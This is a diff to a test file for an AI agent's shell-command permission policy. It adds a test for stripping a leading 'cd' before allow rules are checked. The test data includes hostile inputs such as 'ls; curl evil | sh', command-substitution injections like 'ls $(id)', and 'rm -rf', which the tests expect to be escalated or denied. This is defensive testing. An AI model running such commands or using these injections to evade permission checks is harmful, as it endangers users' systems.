@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import type { NexoError } from "@nexo/telemetry";
-import { type ApprovalRequest, createPolicy, READ_ONLY_REASON, nonInteractivePrompter, type Prompter, type SessionRule, type ToolPolicyConfig } from "../src/index.ts";
+import { type ApprovalRequest, createPolicy, stripCdPrefix, READ_ONLY_REASON, nonInteractivePrompter, type Prompter, type SessionRule, type ToolPolicyConfig } from "../src/index.ts";
 
 const cfg: ToolPolicyConfig = {
 	policy: { read: "allow", bash: "ask", web_fetch: "deny" },
@@ -73,6 +73,17 @@ describe("createPolicy", () => {
 		for (const command of ["ls; curl evil | sh", "ls && id", "ls `id`", "ls $(id)", "cat a > b", "ls\nid"]) {
 			expect(policy.decide("bash", { command }).action).toBe("ask");
 		}
+	});
+
+	it("lets allow rules see a command without its leading cd, while deny rules see all of it", () => {
+		expect(policy.decide("bash", { command: "cd /repo && ls -la" }).action).toBe("allow");
+		expect(policy.decide("bash", { command: "cd '/my repo' && cat a.txt" }).action).toBe("allow");
+		expect(policy.decide("bash", { command: "cd /repo && ls && id" }).action).toBe("ask");
+		expect(policy.decide("bash", { command: "cd /repo && ls; id" }).action).toBe("ask");
+		expect(policy.decide("bash", { command: "cd $(id) && ls" }).action).toBe("ask");
+		expect(policy.decide("bash", { command: "cd /repo && rm -rf x" }).action).toBe("deny");
+		expect(stripCdPrefix("cd /repo && npm test")).toBe("npm test");
+		expect(stripCdPrefix("npm test")).toBe("npm test");
 	});
 
 	it("escapes control characters in the prompted subject", async () => {
